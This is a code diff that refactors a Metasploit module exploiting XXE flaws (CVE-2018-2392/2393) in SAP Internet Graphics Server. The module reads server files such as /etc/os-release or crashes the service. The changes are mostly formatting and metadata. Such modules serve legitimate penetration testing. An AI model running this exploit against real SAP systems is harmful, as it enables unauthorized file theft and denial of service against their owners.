@@ -9,40 +9,45 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(
-        update_info(
-          info,
-          'Name' => 'SAP Internet Graphics Server (IGS) XMLCHART XXE',
-          'Description' => %q{
-            This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
-            of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. These
-            vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when
-            submitting a POST request to the XMLCHART page to generate a new chart.
+      update_info(
+        info,
+        'Name' => 'SAP Internet Graphics Server (IGS) XMLCHART XXE',
+        'Description' => %q{
+          This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
+          of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. These
+          vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when
+          submitting a POST request to the XMLCHART page to generate a new chart.
 
-            Successful exploitation will allow unauthenticated remote attackers to read files from the server as the user
-            from which the IGS service is started, which will typically be the SAP admin user. Alternatively attackers
-            can also abuse the XXE vulnerability to conduct a denial of service attack against the vulnerable
-            SAP IGS server.
-          },
-          'Author' => [
-            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
-            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
-          ],
-          'License' => MSF_LICENSE,
-          'References' => [
-            [ 'CVE', '2018-2392' ],
-            [ 'CVE', '2018-2393' ],
-            [ 'URL', 'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf' ]
-          ],
-          'Actions' => [
-            [ 'READ', { 'Description' => 'Remote file read' } ],
-            [ 'DOS', { 'Description' => 'Denial Of Service' } ]
-          ],
-          'DefaultAction' => 'READ',
-          'DefaultOptions' => {
-            'SSL' => false # Disable SSL (by default SAP IGS does not use SSL/TLS)
-          },
-          'DisclosureDate' => '2018-03-14'
-        )
+          Successful exploitation will allow unauthenticated remote attackers to read files from the server as the user
+          from which the IGS service is started, which will typically be the SAP admin user. Alternatively attackers
+          can also abuse the XXE vulnerability to conduct a denial of service attack against the vulnerable
+          SAP IGS server.
+        },
+        'Author' => [
+          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
+          'Vladimir Ivanov' # @_generic_human_ This Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2018-2392' ],
+          [ 'CVE', '2018-2393' ],
+          [ 'URL', 'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf' ]
+        ],
+        'Actions' => [
+          [ 'READ', { 'Description' => 'Remote file read' } ],
+          [ 'DOS', { 'Description' => 'Denial Of Service' } ]
+        ],
+        'DefaultAction' => 'READ',
+        'DefaultOptions' => {
+          'SSL' => false # Disable SSL (by default SAP IGS does not use SSL/TLS)
+        },
+        'DisclosureDate' => '2018-03-14',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
     )
     register_options(
       [
@@ -65,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     @data_xml = {
       name: Rex::Text.rand_text_alphanumeric(12),
-      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      filename: "#{Rex::Text.rand_text_alphanumeric(12)}.xml",
       data: nil
     }
     @data_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
@@ -81,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
     </ChartData>)
     @xxe_xml = {
       name: Rex::Text.rand_text_alphanumeric(12),
-      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
+      filename: "#{Rex::Text.rand_text_alphanumeric(12)}.xml",
       data: nil
     }
   end
@@ -101,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     </SAPChartCustomizing>)
   end
 
-  def make_post_data(file_name, dos = false)
+  def make_post_data(file_name, dos: false)
     if !dos
       make_xxe_xml(file_name)
     else
@@ -204,7 +209,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # Check second HTTP response
       if second_response.nil? || second_response.code != 200 || !second_response.body.include?('area shape=rect')
-        return -2 # Reponse from second HTTP request was not what was expected!
+        return -2 # Response from second HTTP request was not what was expected!
       end
 
       get_file_content(second_response.body)
@@ -215,14 +220,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-
     # Set up variables
     os_release = ''
     os_release_file = '/etc/os-release'
 
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(os_release_file, false) # Create a XML data payload to retrieve the value of /etc/os-release
+    make_post_data(os_release_file, dos: false) # Create a XML data payload to retrieve the value of /etc/os-release
     # so that the module can check if the target is vulnerable or not.
 
     # Get OS release information
@@ -294,10 +298,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_file_read
-
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(@file, false)
+    make_post_data(@file, dos: false)
 
     # Download remote file
     first_response = send_first_request
@@ -349,10 +352,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_dos
-
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data(@file, true)
+    make_post_data(@file, dos: true)
 
     # Send HTTP request
     begin
@@ -389,7 +391,6 @@ class MetasploitModule < Msf::Auxiliary
 
     # Check HTTP response
     fail_with(Failure::NotVulnerable, 'The target responded with a 200 OK response code. The DoS attempt was unsuccessful.') unless dos_response.code != 200
-
   end
 
 end
